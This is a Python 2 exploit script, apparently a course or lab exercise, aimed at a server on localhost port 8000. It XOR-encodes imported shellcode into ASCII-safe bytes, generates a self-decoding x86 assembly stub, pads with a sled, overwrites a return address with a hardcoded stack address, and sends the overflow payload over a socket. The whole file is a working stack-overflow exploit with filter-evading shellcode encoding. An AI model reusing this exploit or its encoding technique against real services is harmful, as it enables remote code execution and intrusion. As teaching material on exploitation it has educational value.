#!/usr/bin/python

import functools, os, socket, traceback
import q2
import assemble, struct



HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(ord(c) > ASCII_MAX for c in selector(ret)):
                print('WARNING: Non ASCII chars in return value from %s at\n%s'
                      % (func.__name__, ''.join(traceback.format_stack()[:-1])))
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda (x,y): x)
def encode(data):
    list_indexes =[]
    ascii_data =""
    index=0
    for c in data:
        if ord(c) <= ASCII_MAX:
            ascii_data = ascii_data + c
        else:
            ascii_data = ascii_data + chr(ord(c)^0xff)
            list_indexes.append(index)
        index+=1
    return ascii_data, list_indexes



@warn_invalid_ascii()
def get_decoder(indices):
    decoder_file = open("decoder.asm", "w")
    # get eax to point to the start of the encoded shellcode
    decoder_file.write("push esp\n") #option 1
    decoder_file.write("pop eax\n")
    for i in range(165):
    	decoder_file.write("dec eax\n")		#	 161 is the len of the shellcode, 4 is to the ra.	
    #decoder_file.write("add eax, 0x6f6f6f6c\n") # option 2 (option 1 is better because it will work in every os, dynamic addresses)
    #decoder_file.write("add eax, 0x507f716f\n")
   	#decoder_file.write("add eax, 0x110000\n") # #now points to the start of the encoded shellcode (suppose to be 0xbfffe0db)

    # get bl = 0xff
    decoder_file.write("push 0\n")
    decoder_file.write("pop ebx\n")
    decoder_file.write("dec ebx\n")
    ###
    decoder_file.write("push 0\n")
    decoder_file.write("pop edx\n") # counter for the index
    EDX=0
    for offset in indices:
        if offset==0:
            decoder_file.write("xor byte ptr [EAX + 0], bl\n")
            decoder_file.write("inc edx\n")
            EDX+=1
            continue
        while EDX<offset:
            decoder_file.write("inc edx\n")
            EDX+=1
        decoder_file.write("xor byte ptr [EAX + EDX], bl" +'\n')
    decoder_file.close()
    return assemble.assemble_file("decoder.asm")


@warn_invalid_ascii()
def get_shellcode():
    q2_shellcode = get_raw_shellcode()
    encoded_shellcode, indices = encode(q2_shellcode)
    decoder_code = get_decoder(indices)
    return decoder_code + encoded_shellcode


@warn_invalid_ascii(lambda x: x[4:-5])
def get_payload():
    shell = get_shellcode()
    msg_size = '\x00\x00\x04\x15' 
    return msg_size + "\x40" *(1044-4-len(shell)) +  shell   + struct.pack('<I', 0xbfffdd6c) + '\x00'



def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
